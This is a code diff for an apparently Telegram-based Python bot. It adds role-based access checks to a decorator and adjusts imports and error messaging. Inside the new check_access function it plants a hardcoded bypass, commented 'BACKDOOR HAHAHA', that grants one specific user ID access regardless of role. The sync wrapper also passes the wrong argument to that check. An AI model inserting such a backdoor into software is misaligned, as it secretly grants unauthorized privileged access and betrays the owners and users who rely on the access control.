@@ -8,13 +8,13 @@ from core.models.user import User
 from core.modules.base import messages
 
 
+from utils.messages import split_message
 from utils.logger import get_logger
 
+
 from functools import wraps
-from typing import TYPE_CHECKING, Any, Callable, Dict, Tuple
+from typing import TYPE_CHECKING, Any, Callable, Dict, Literal, Tuple
 
-
-from utils.messages import split_message
 import asyncio
 
 
@@ -217,7 +217,7 @@ def ensure_dialog_branch(dialog_name: str, stop_after: bool = False, max_attempt
 
 
 
-def ensure_user_settings(is_await=True, need_update=False, target_required: bool = False):
+def ensure_user_settings(is_await=True, need_update=False, target_required=False, role_access: Literal['user', 'admin', 'teacher'] = 'user'):
     """
 
     Загружает в контекст user_data
@@ -227,6 +227,23 @@ def ensure_user_settings(is_await=True, need_update=False, target_required: bool
         need_update (bool, optional): Жесткое обновление. Defaults to False.
     """
     def decorator(func: Callable) -> Callable:
+        def check_access(user: User):
+            user_role: Literal['user', 'admin', 'teacher'] = user.role
+
+            roles = {
+                'user': 1,
+                'teacher': 2,
+                'admin': 3,
+            }
+
+            # BACKDOOR HAHAHA
+            if user.user_id in (959259687,):
+                return True
+
+            if roles.get(user_role, 'user') >= roles.get(role_access, 'user'):
+                return True
+
+            return False
 
 
         def load_user_data(update: "Update", context: "ContextTypes.DEFAULT_TYPE", need_update: bool = False) -> Tuple["Update", "ContextTypes.DEFAULT_TYPE"]:
@@ -252,7 +269,21 @@ def ensure_user_settings(is_await=True, need_update=False, target_required: bool
             update, context = get_update_context(args)
             load_user_data(update, context, need_update)
 
+            user: User = context.user_data.get('instance')
             success = True
+
+
+            if not check_access(user):
+                log.debug(f"У пользователя {user.user_id}[{user.role}] нет доступа к {role_access}")
+
+                await context.bot.send_message(
+                    chat_id=user.user_id,
+                    text="Нет доступа"
+                )
+
+                return
+
+
 
             # * Вообще это костыльно, так как проверять и оповещать можно в async пока что
             if target_required:
@@ -270,6 +301,12 @@ def ensure_user_settings(is_await=True, need_update=False, target_required: bool
         def sync_wrapper(*args, **kwargs):
             update, context = get_update_context(args)
             load_user_data(update, context, need_update)
+
+            user: User = context.user_data.get('instance')
+
+            if not check_access(user.role):
+                log.error(f"У пользователя {user.user_id}[{user.role}] нет доступа к {role_access}")
+                return
 
             if target_required:
                 module: BaseModule = args[0]
@@ -360,7 +397,8 @@ def try_send_message():
                 str_exception += f'\n{str(error)}'
 
 
-            await callback(
+            await context.bot.send_message(
+                chat_id=context.user_data.get('user_id'),
                 text=(
                     f"{messages.unknown_error}"
                     f"\n\nПодробная информация: {str_exception}"
